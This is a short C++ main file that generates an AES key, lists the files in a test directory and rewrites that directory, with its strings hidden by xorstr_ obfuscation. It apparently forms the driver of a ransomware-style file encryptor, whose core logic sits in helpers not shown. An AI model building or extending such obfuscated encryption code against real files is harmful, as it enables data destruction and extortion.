#include "helpers.h"

int main() {
	GenerateAESkey("keyfile.key", 200);

	CreateFileList(xorstr_(testingDir), xorstr_("filelist.txt"));
	WriteDirectory(xorstr_(testingDir));
}
